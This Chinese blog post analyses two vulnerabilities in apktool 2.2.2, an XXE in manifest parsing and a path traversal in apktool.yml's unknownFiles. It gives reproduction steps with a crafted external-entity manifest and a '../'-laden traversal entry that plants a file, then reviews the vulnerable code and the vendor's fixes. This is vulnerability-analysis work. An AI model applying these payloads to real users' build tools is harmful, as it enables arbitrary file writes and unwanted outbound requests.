---
title: apktool漏洞利用分析
date: 2018-03-17 19:29:43
tags: Android
---

## 0x00 分析环境

apktool 版本：2.2.2  [https://connortumbleson.com/2017/01/23/apktool-v2-2-2-released/](https://connortumbleson.com/2017/01/23/apktool-v2-2-2-released/)

参考链接：[https://security.tencent.com/index.php/blog/msg/122](https://security.tencent.com/index.php/blog/msg/122)

## 0x01 XXE漏洞利用分析

原理：Apktool在解析AndroidManifest.xml文件时，没有禁用外部实体，导致了外部实体注入攻击漏洞

<!--more-->

利用过程：

首先创建一个简单的APK，利用apktool反编译：
​    

```
mask@mask-virtual-machine:~/AndroidXXE$ java -jar apktool_2.2.2.jar d app-release.apk -o xxe
I: Using Apktool 2.2.2 on app-release.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/mask/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: null reference: m1=0x01010540(reference), m2=0xffffffff(bool)
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
```

反编译后,进入xxe文件夹修改AndroidManifest.xml:

原文件：
​    

```
<?xml version="1.0" encoding="utf-8" standalone="no"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="test.mask.com.apk" platformBuildVersionCode="26" platformBuildVersionName="8.0.0">
<meta-data android:name="android.support.VERSION" android:value="26.0.0-alpha1"/>
<application android:allowBackup="true" android:icon="@mipmap/ic_launcher" android:label="@string/app_name" android:roundIcon="@mipmap/ic_launcher_round" android:supportsRtl="true" android:theme="@style/AppTheme">
<activity android:name="test.mask.com.apk.MainActivity">
<intent-filter>
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
</activity>
</application>
</manifest>
```

​    

修改成：

```
<?xml version="1.0" encoding="utf-8" standalone="no"?>
<!DOCTYPE manifest [<!ENTITY xxe SYSTEM 'https://www.52pojie.cn/;'>]>
 &xxe;
<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="test.mask.com.apk" platformBuildVersionCode="26" platformBuildVersionName="8.0.0">
<meta-data android:name="android.support.VERSION" android:value="26.0.0-alpha1"/>
<application android:allowBackup="true" android:icon="@mipmap/ic_launcher" android:label="@string/app_name" android:roundIcon="@mipmap/ic_launcher_round" android:supportsRtl="true" android:theme="@style/AppTheme">
<activity android:name="test.mask.com.apk.MainActivity">
<intent-filter>
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
</activity>
</application>
</manifest>
```

然后保存，再使用apktool进行重打包：

```
mask@mask-virtual-machine:~/AndroidXXE$ java -jar apktool_2.2.2.jar b xxe/ -o xxe.apk
I: Using Apktool 2.2.2
I: Checking whether sources has changed...
I: Smaling smali folder into classes.dex...
I: Checking whether resources has changed...
I: Building resources...
I: Building apk file...
I: Copying unknown files/dir...
```

捕捉到了流量，那么确实是访问了

{% asset_img 0.png  %}


源码分析：



首先分析Main.java

{% asset_img 1.png  %}

这里接受传入的参数，`d`单表反编译，`b`代表重打包，因为这个漏洞是在重打包时触发的，那么我们就跟进`cmdBuild()`这个函数

```
private static void cmdBuild(final CommandLine cli) throws BrutException {
    final String[] args = cli.getArgs();
    final String appDirName = (args.length < 2) ? "." : args[1];
    File outFile = null;
    final ApkOptions apkOptions = new ApkOptions();
    if (cli.hasOption("f") || cli.hasOption("force-all")) {
        apkOptions.forceBuildAll = true;
    }
    if (cli.hasOption("d") || cli.hasOption("debug")) {
        System.out.println("SmaliDebugging has been removed in 2.1.0 onward. Please see: https://github.com/iBotPeaches/Apktool/issues/1061");
        apkOptions.debugMode = true;
    }
    if (cli.hasOption("v") || cli.hasOption("verbose")) {
        apkOptions.verbose = true;
    }
    if (cli.hasOption("a") || cli.hasOption("aapt")) {
        apkOptions.aaptPath = cli.getOptionValue("a");
    }
    if (cli.hasOption("c") || cli.hasOption("copy-original")) {
        apkOptions.copyOriginalFiles = true;
    }
    if (cli.hasOption("p") || cli.hasOption("frame-path")) {
        apkOptions.frameworkFolderLocation = cli.getOptionValue("p");
    }
    if (cli.hasOption("o") || cli.hasOption("output")) {
        outFile = new File(cli.getOptionValue("o"));
    }
    else {
        outFile = null;
    }
    new Androlib(apkOptions).build(new File(appDirName), outFile);
}
```

前面一大堆都不重要，就是一些参数选项，最后一句开始build apk,那么我们跟进这个`build`函数

```
public void build(File appDir, File outFile) throws BrutException {
	build(new ExtFile(appDir), outFile);
}
```

继续跟进：

```
public void build(final ExtFile appDir, File outFile) throws BrutException {
	Androlib.LOGGER.info("Using Apktool " + getVersion());
	final MetaInfo meta = this.readMetaFile(appDir);
	this.apkOptions.isFramework = meta.isFrameworkApk;
	this.apkOptions.resourcesAreCompressed = meta.compressionType;
	this.apkOptions.doNotCompress = meta.doNotCompress;
	this.mAndRes.setSdkInfo(meta.sdkInfo);
	this.mAndRes.setPackageId(meta.packageInfo);
	this.mAndRes.setPackageRenamed(meta.packageInfo);
	this.mAndRes.setVersionInfo(meta.versionInfo);
	this.mAndRes.setSharedLibrary(meta.sharedLibrary);
	if (meta.sdkInfo != null && meta.sdkInfo.get("minSdkVersion") != null) {
		this.mMinSdkVersion = Integer.parseInt(meta.sdkInfo.get("minSdkVersion"));
	}
	if (outFile == null) {
		final String outFileName = meta.apkFileName;
		outFile = new File(appDir, "dist" + File.separator + ((outFileName == null) ? "out.apk" : outFileName));
	}
	new File(appDir, "build/apk").mkdirs();
	this.buildSources(appDir);
	this.buildNonDefaultSources(appDir);
	final File manifest = new File(appDir, "AndroidManifest.xml");
	final File manifestOriginal = new File(appDir, "AndroidManifest.xml.orig");
	if (manifest.isFile() && manifest.exists()) {
		try {
			if (manifestOriginal.exists()) {
				manifestOriginal.delete();
			}
		FileUtils.copyFile(manifest, manifestOriginal);
		ResXmlPatcher.fixingPublicAttrsInProviderAttributes(manifest);
		}
		catch (IOException ex) {
			throw new AndrolibException(ex.getMessage());
		}
	}
	this.buildResources(appDir, meta.usesFramework);
	this.buildLib(appDir);
	this.buildLibs(appDir);
	this.buildCopyOriginalFiles(appDir);
	this.buildApk(appDir, outFile);
	this.buildUnknownFiles(appDir, outFile, meta);
	if (manifest.isFile() && manifest.exists()) {
		try {
			if (new File(appDir, "AndroidManifest.xml").delete()) {
				FileUtils.moveFile(manifestOriginal, manifest);
			}
		}
		catch (IOException ex) {
			throw new AndrolibException(ex.getMessage());
		}
	}
}
```

前面一大堆不用看，直接看操作AndroidManifest.xml的地方，

```
ResXmlPatcher.fixingPublicAttrsInProviderAttributes(manifest);
}
```

继续跟进：

```
public static void fixingPublicAttrsInProviderAttributes(final File file) throws AndrolibException {
    boolean saved = false;
    if (file.exists()) {
        try {
            final Document doc = loadDocument(file);
            XPath xPath = XPathFactory.newInstance().newXPath();
            XPathExpression expression = xPath.compile("/manifest/application/provider");
            Object result = expression.evaluate(doc, XPathConstants.NODESET);
            NodeList nodes = (NodeList)result;
            for (int i = 0; i < nodes.getLength(); ++i) {
                final Node node = nodes.item(i);
                final NamedNodeMap attrs = node.getAttributes();
                if (attrs != null) {
                    final Node provider = attrs.getNamedItem("android:authorities");
                    if (provider != null) {
                        final String reference = provider.getNodeValue();
                        final String replacement = pullValueFromStrings(file.getParentFile(), reference);
                        if (replacement != null) {
                            provider.setNodeValue(replacement);
                            saved = true;
                        }
                    }
                }
            }
            xPath = XPathFactory.newInstance().newXPath();
            expression = xPath.compile("/manifest/application/activity/intent-filter/data");
            result = expression.evaluate(doc, XPathConstants.NODESET);
            nodes = (NodeList)result;
            for (int i = 0; i < nodes.getLength(); ++i) {
                final Node node = nodes.item(i);
                final NamedNodeMap attrs = node.getAttributes();
                if (attrs != null) {
                    final Node provider = attrs.getNamedItem("android:scheme");
                    if (provider != null) {
                        final String reference = provider.getNodeValue();
                        final String replacement = pullValueFromStrings(file.getParentFile(), reference);
                        if (replacement != null) {
                            provider.setNodeValue(replacement);
                            saved = true;
                        }
                    }
                }
            }
            if (saved) {
                saveDocument(file, doc);
            }
        }
        catch (SAXException ex) {}
        catch (ParserConfigurationException ex2) {}
        catch (IOException ex3) {}
        catch (XPathExpressionException ex4) {}
        catch (TransformerException ex5) {}
    }
}
```

这里对文件进行了处理：

```
final Document doc = loadDocument(file)
```

再跟进：

```
private static Document loadDocument(final File file) throws IOException, SAXException, ParserConfigurationException {
    final DocumentBuilderFactory docFactory = DocumentBuilderFactory.newInstance();
    final DocumentBuilder docBuilder = docFactory.newDocumentBuilder();
    return docBuilder.parse(file);
}
```

可以发现此处就是直接对AndroidManifest.xml文件进行解析，并没有禁用外部实体，那么来看看作者是怎样修复的

{% asset_img 2.png  %}

加入了禁用外部实体然后再解析：

```
/**
 *
 * @param file File to load into Document
 * @return Document
 * @throws IOException
 * @throws SAXException
 * @throws ParserConfigurationException
 */
private static Document loadDocument(File file)
        throws IOException, SAXException, ParserConfigurationException {

    DocumentBuilderFactory docFactory = DocumentBuilderFactory.newInstance();
    docFactory.setFeature(FEATURE_DISABLE_DOCTYPE_DECL, true);
    docFactory.setFeature(FEATURE_LOAD_DTD, false);

    try {
        docFactory.setAttribute(ACCESS_EXTERNAL_DTD, " ");
        docFactory.setAttribute(ACCESS_EXTERNAL_SCHEMA, " ");
    } catch (IllegalArgumentException ex) {
        LOGGER.warning("JAXP 1.5 Support is required to validate XML");
    }

    DocumentBuilder docBuilder = docFactory.newDocumentBuilder();
    // Not using the parse(File) method on purpose, so that we can control when
    // to close it. Somehow parse(File) does not seem to close the file in all cases.
    FileInputStream inputStream = new FileInputStream(file);
    try {
    	return docBuilder.parse(inputStream);
    } finally {
    	inputStream.close();
    }
}
```

## 0x02 路径穿越漏洞

原理：Apktool在解析apktool.yml时，因为没有对“../"字符串过滤，导致漏洞发生

利用过程：

还是用刚才那个apk，依旧使用apktool进行反编译：
​    

```
mask@mask-virtual-machine:~/AndroidTraveral$ java -jar apktool_2.2.2.jar d app-release.apk -o demo
I: Using Apktool 2.2.2 on app-release.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/mask/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
```

​    
编辑apktool.yml

原文件：
​    

```
!!brut.androlib.meta.MetaInfo
apkFileName: app-release.apk
compressionType: false
doNotCompress:
- arsc
isFrameworkApk: false
packageInfo:
  forcedPackageId: '127'
  renameManifestPackage: null
sdkInfo:
  minSdkVersion: '19'
  targetSdkVersion: '26'
sharedLibrary: false
unknownFiles: {}
usesFramework:
  ids:
  - 1
  tag: null
version: 2.2.2
versionInfo:
  versionCode: '1'
  versionName: '1.0'
```

对unknownFiles的值进行修改：

```
unknownFiles: 
  Demo: '8'
  ../../../../../../../../home/mask/AndroidTraveral/Shell: '8'
```

（Shell路径自行修改）

因为apk太简单，反编译后没有生成unknown文件夹，那么我们手动创建一个，并且添加一个Demo文件（unknown文件夹不能为空，否则后面再次反编译的时候，不会释放Shell文件）

1. 在反编译文件夹下新建一个unknown文件夹，并且创建一个Demo文件（空白即可）
2. 按照刚才Shell路径，在此路径下添加一个Shell文件

{% asset_img 3.png  %}

然后进行重打包：
​    

```
mask@mask-virtual-machine:~/AndroidTraveral$ java -jar apktool_2.2.2.jar b demo/ -o demo.apk
I: Using Apktool 2.2.2
I: Checking whether sources has changed...
I: Checking whether resources has changed...
I: Building apk file...
I: Copying unknown files/dir...
```

然后我们将之前创建的Shell删除，再次使用apktool反编译：
​    

```
mask@mask-virtual-machine:~/AndroidTraveral$ java -jar apktool_2.2.2.jar d demo.apk -o poc
I: Using Apktool 2.2.2 on demo.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/mask/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
```

那么可以看到，文件确实释放了

{% asset_img 4.png  %}

源码分析：

反编译时

```
this.mAndrolib.decodeUnknownFiles(this.mApkFile, outDir, this.mResTable);
```

跟进查看：

```
public void decodeUnknownFiles(final ExtFile apkFile, final File outDir, final ResTable resTable) throws AndrolibException {
    Androlib.LOGGER.info("Copying unknown files...");
    final File unknownOut = new File(outDir, "unknown");
    try {
        final Directory unk = apkFile.getDirectory();
        final Set<String> files = unk.getFiles(true);
        for (final String file : files) {
            if (!this.isAPKFileNames(file) && !file.endsWith(".dex")) {
                unk.copyToDir(unknownOut, file);
                this.mResUnknownFiles.addUnknownFileInfo(file, String.valueOf(unk.getCompressionLevel(file)));
            }
        }
    }
    catch (DirectoryException ex) {
        throw new AndrolibException(ex);
    }
}
```



再来看下重打包的时候：

```
// we must go after the Apk is built, and copy the files in via Zip
    // this is because Aapt won't add files it doesn't know (ex unknown files)
    buildUnknownFiles(appDir, outFile, meta);
```

跟进：

```
public void buildUnknownFiles(File appDir, File outFile, MetaInfo meta)
        throws AndrolibException {
    if (meta.unknownFiles != null) {
        LOGGER.info("Copying unknown files/dir...");

        Map<String, String> files = meta.unknownFiles;
        File tempFile = new File(outFile.getParent(), outFile.getName() + ".apktool_temp");
        boolean renamed = outFile.renameTo(tempFile);
        if(!renamed) {
            throw new AndrolibException("Unable to rename temporary file");
        }

        try (
                ZipFile inputFile = new ZipFile(tempFile);
                ZipOutputStream actualOutput = new ZipOutputStream(new FileOutputStream(outFile))
        ) {
            copyExistingFiles(inputFile, actualOutput);
            copyUnknownFiles(appDir, actualOutput, files);
        } catch (IOException | BrutException ex) {
            throw new AndrolibException(ex);
        }

        // Remove our temporary file.
        tempFile.delete();
    }
}
```

这一句

```
copyUnknownFiles(appDir, actualOutput, files);
```

然后跟进：

```
private void copyUnknownFiles(final File appDir, final ZipOutputStream outputFile, final Map<String, String> files) throws IOException {
    final File unknownFileDir = new File(appDir, "unknown");
    for (final Map.Entry<String, String> unknownFileInfo : files.entrySet()) {
        final File inputFile = new File(unknownFileDir, unknownFileInfo.getKey());
        if (inputFile.isDirectory()) {
            continue;
        }
        final ZipEntry newEntry = new ZipEntry(unknownFileInfo.getKey());
        final int method = Integer.parseInt(unknownFileInfo.getValue());
        Androlib.LOGGER.fine(String.format("Copying unknown file %s with method %d", unknownFileInfo.getKey(), method));
        if (method == 0) {
            newEntry.setMethod(0);
            newEntry.setSize(inputFile.length());
            newEntry.setCompressedSize(-1L);
            final BufferedInputStream unknownFile = new BufferedInputStream(new FileInputStream(inputFile));
            final CRC32 crc = BrutIO.calculateCrc(unknownFile);
            newEntry.setCrc(crc.getValue());
        }
        else {
            newEntry.setMethod(8);
        }
        outputFile.putNextEntry(newEntry);
        BrutIO.copy(inputFile, outputFile);
        outputFile.closeEntry();
    }
}
```

可以看到这里貌似并没有作啥路径的检测，那么就会导致可能导致存在非法路径，重打包后再解析就会触发漏洞

来看看作者更新后，左边为更新后，右边为原文件

{% asset_img 5.png  %}

从函数名来看是进行检测，跟进这个函数

```
public static String sanitizeUnknownFile(final File directory, final String entry) throws IOException, BrutException {
    if (entry.length() == 0) {
        throw new InvalidUnknownFileException("Invalid Unknown File - " + entry);
    }

    if (new File(entry).isAbsolute()) {
        throw new RootUnknownFileException("Absolute Unknown Files is not allowed - " + entry);
    }

    final String canonicalDirPath = directory.getCanonicalPath() + File.separator;
    final String canonicalEntryPath = new File(directory, entry).getCanonicalPath();

    if (!canonicalEntryPath.startsWith(canonicalDirPath)) {
        throw new TraversalUnknownFileException("Directory Traversal is not allowed - " + entry);
    }

    // https://stackoverflow.com/q/2375903/455008
    return canonicalEntryPath.substring(canonicalDirPath.length());
}
```

那么可以看到这里的报错提示就是绝对路径下的文件不允许，路径穿越不允许:)

